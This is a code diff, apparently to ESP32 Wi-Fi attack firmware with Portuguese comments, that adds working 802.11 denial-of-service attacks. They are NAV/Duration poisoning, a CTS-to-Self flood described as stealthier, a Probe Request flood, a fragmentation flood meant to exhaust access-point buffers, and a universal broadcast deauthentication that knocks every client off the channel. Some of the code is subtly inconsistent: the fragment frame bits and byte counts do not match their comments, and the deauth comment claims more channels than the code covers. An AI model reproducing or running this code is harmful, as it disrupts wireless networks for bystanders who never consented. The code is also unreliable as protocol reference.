@@ -25,6 +25,19 @@ public:
     bool csaMode         = false; // Channel Switch Announcement — move clientes para outro canal
     bool eapFlood        = false; // EAP Identity Request flood — confunde supplicants
     bool tkipInjection   = false; // Envia EAPOL-Key com MIC failure (reason 0x0E) — TKIP countermeasure
+
+    // ── Ataques de negação de serviço no meio físico ──────────────────────────
+    bool navFlood        = false; // NAV/Duration poison — reserva o meio por 32767µs
+                                  // Todos os dispositivos no canal param de transmitir
+    bool ctsFlood        = false; // CTS-to-Self flood — mesmo efeito do NAV sem spoofar MAC
+                                  // Mais furtivo: parece frame legítimo de controle
+    bool probeFlood      = false; // Probe Request flood com MACs aleatórios
+                                  // Consome CPU/memória do AP respondendo a clientes inexistentes
+    bool fragFlood       = false; // Fragmentation flood — fragmentos sem frame final
+                                  // Esgota buffers de reassembly do AP (ataque de memória)
+    bool deauthAll       = false; // Deauth universal — desconecta TODOS os clientes de TODOS os APs
+                                  // no canal atual simultaneamente (modo nuclear por canal)
+
     uint8_t csaChannel   = 13;    // Canal destino para CSA attack
     uint8_t csaCount     = 5;     // Contagem regressiva CSA (frames até troca)
     char targetSSID[33]  = {};    // SSID do AP alvo (para reconnectBlock/CSA)
@@ -211,6 +224,60 @@ private:
         if (tkipInjection && !broadcastMode) {
             _sendTKIPMicFailure(targetAP, targetClient);
             framesSent++;
+        }
+
+        // NAV/Duration Poison: envia frames com Duration=32767µs (máximo IEEE 802.11)
+        // Todos os dispositivos no canal setam seu NAV e ficam em silêncio
+        // Efeito: congela COMPLETAMENTE o canal — nenhum dispositivo consegue transmitir
+        if (navFlood) {
+            for (int i = 0; i < 32; i++) {
+                _sendNAVPoison(targetAP, channel);
+                framesSent++;
+            }
+        }
+
+        // CTS-to-Self flood: CTS (Clear To Send) com Duration=32767µs
+        // Mais furtivo que NAV puro — parece frame de controle normal
+        // Afeta toda a BSS sem precisar spoofar MAC de destino específico
+        if (ctsFlood) {
+            for (int i = 0; i < 32; i++) {
+                _sendCTSFlood(targetAP, channel);
+                framesSent++;
+            }
+        }
+
+        // Probe Request flood: inunda AP com requisições de clientes fantasma
+        // Cada AP responde com Probe Response → consome CPU, memória e banda do AP
+        // APs mais fracos (roteadores domésticos) travam com ~500 req/s
+        if (probeFlood) {
+            for (int i = 0; i < 16; i++) {
+                _sendProbeFlood(targetSSID[0] ? targetSSID : nullptr, channel);
+                framesSent++;
+            }
+        }
+
+        // Fragmentation flood: envia fragmento 1/X sem jamais enviar o fragmento final
+        // AP reserva buffer para remontar — com centenas de fragmentos pendentes,
+        // o buffer de reassembly esgota e o AP para de aceitar frames legítimos
+        if (fragFlood) {
+            for (int i = 0; i < 8; i++) {
+                _sendFragmentFlood(targetAP, channel);
+                framesSent++;
+            }
+        }
+
+        // Deauth universal: deautentica broadcast em todos os canais em sequência
+        // Usa MACs genéricos para atingir qualquer AP no canal sem precisar do BSSID
+        if (deauthAll) {
+            const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+            uint8_t fakeBSSID[6]   = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+            for (int i = 0; i < 8; i++) {
+                esp_fill_random(fakeBSSID, 6);
+                fakeBSSID[0] &= 0xFE; // unicast bit
+                _sendDeauth(fakeBSSID, bcast, _reasons[i % 16]);
+                _sendDisassoc(fakeBSSID, bcast, _reasons[i % 16]);
+                framesSent += 2;
+            }
         }
     }
 
@@ -409,6 +476,100 @@ private:
         // TSC (Timestamp Counter) aleatório
         esp_fill_random(f+27, 6);
         esp_wifi_80211_tx(WIFI_IF_AP, f, 33, true);
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // Novos ataques de DoS no meio físico 802.11
+    // ─────────────────────────────────────────────────────────────────────────
+
+    // NAV Poison: Data frame com Duration=32767µs (máximo IEEE 802.11-2020)
+    // Virtual NAV: todos os STA/AP que ouvem setam seu timer NAV para 32ms
+    // Enviado continuamente → nenhum dispositivo consegue transmitir no canal
+    void _sendNAVPoison(const uint8_t* ap, uint8_t ch) {
+        (void)ch;
+        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+        uint8_t f[24] = {};
+        f[0] = 0x08; f[1] = 0x00;      // Data frame
+        f[2] = 0xFF; f[3] = 0x7F;      // Duration = 32767µs (máximo)
+        memcpy(f+4,  bcast, 6);         // DA = broadcast
+        memcpy(f+10, ap,    6);         // SA = AP alvo (spoofado)
+        memcpy(f+16, ap,    6);         // BSSID = AP alvo
+        uint16_t sq = _nextSeq();
+        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
+        esp_wifi_80211_tx(WIFI_IF_AP, f, 24, false);
+    }
+
+    // CTS-to-Self: frame de controle com Duration=32767µs
+    // Mais furtivo — CTS é um frame de controle esperado pelo protocolo
+    // Não precisa de BSSID no frame (frame de controle não tem campo BSSID)
+    void _sendCTSFlood(const uint8_t* ap, uint8_t ch) {
+        (void)ch;
+        // CTS frame: FC(2) + Duration(2) + RA(6) = 10 bytes
+        uint8_t f[10] = {};
+        f[0] = 0xC4; f[1] = 0x00;  // CTS (0xC4 = subtype 12, type Control)
+        f[2] = 0xFF; f[3] = 0x7F;  // Duration = 32767µs
+        memcpy(f+4, ap, 6);         // RA = AP alvo (fica em silêncio esperando transmitir)
+        esp_wifi_80211_tx(WIFI_IF_AP, f, 10, false);
+    }
+
+    // Probe Request flood com MAC aleatório e SSID alvo (ou wildcard)
+    // AP precisa gerar Probe Response para cada → CPU/memória do AP esgotam
+    void _sendProbeFlood(const char* ssid, uint8_t ch) {
+        uint8_t srcMac[6], bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+        esp_fill_random(srcMac, 6);
+        srcMac[0] |= 0x02; srcMac[0] &= 0xFE; // locally administered, unicast
+
+        uint8_t ssidLen = ssid ? (uint8_t)strlen(ssid) : 0;
+        if (ssidLen > 32) ssidLen = 32;
+
+        uint8_t f[64] = {};
+        uint8_t off = 0;
+        f[off++] = 0x40; f[off++] = 0x00; // Probe Request
+        f[off++] = 0x00; f[off++] = 0x00; // Duration = 0
+        memcpy(f+off, bcast,  6); off += 6; // DA = broadcast
+        memcpy(f+off, srcMac, 6); off += 6; // SA = MAC aleatório
+        memcpy(f+off, bcast,  6); off += 6; // BSSID = broadcast
+        uint16_t sq = _nextSeq();
+        f[off++] = sq & 0xFF; f[off++] = (sq >> 8) & 0xFF;
+        // SSID IE
+        f[off++] = 0x00; f[off++] = ssidLen;
+        if (ssid && ssidLen > 0) { memcpy(f+off, ssid, ssidLen); off += ssidLen; }
+        // Supported Rates IE
+        f[off++] = 0x01; f[off++] = 0x08;
+        const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
+        memcpy(f+off, rates, 8); off += 8;
+        // DS Parameter Set IE
+        f[off++] = 0x03; f[off++] = 0x01; f[off++] = ch;
+        esp_wifi_80211_tx(WIFI_IF_AP, f, off, false);
+    }
+
+    // Fragmentation flood: fragmento 1/3 sem jamais enviar fragmento 2 e 3
+    // AP aloca buffer de reassembly para cada fragmento pendente
+    // Com ~128 fragmentos pendentes distintos, a maioria dos APs trava ou reinicia
+    void _sendFragmentFlood(const uint8_t* ap, uint8_t ch) {
+        (void)ch;
+        uint8_t srcMac[6];
+        esp_fill_random(srcMac, 6);
+        srcMac[0] |= 0x02; srcMac[0] &= 0xFE;
+
+        // Data frame fragmentado: More Fragments bit = 1, Fragment Number = 0
+        uint8_t f[30] = {};
+        f[0] = 0x08;  // Data
+        f[1] = 0x04;  // ToDS=1
+        f[2] = 0x00; f[3] = 0x00;
+        memcpy(f+4,  ap,     6); // RA = AP
+        memcpy(f+10, srcMac, 6); // TA = cliente fantasma
+        memcpy(f+16, ap,     6); // BSSID = AP
+
+        uint16_t sq = (_nextSeq() & 0xFFF0); // sequence number
+        uint16_t fragCtrl = sq | 0x0000;     // fragment 0
+        fragCtrl |= (1 << 2);                // More Fragments bit no sequence control... na verdade no FC
+        // More Fragments bit fica no Frame Control byte 1, bit 2
+        f[1] |= 0x04; // More Fragments = 1
+        f[22] = fragCtrl & 0xFF; f[23] = (fragCtrl >> 8) & 0xFF;
+        // Payload aleatório de 4 bytes (simula início de frame encriptado)
+        esp_fill_random(f+24, 6);
+        esp_wifi_80211_tx(WIFI_IF_AP, f, 30, false);
     }
 
     // Auth Request de MAC aleatório → enche tabela de autenticação do AP
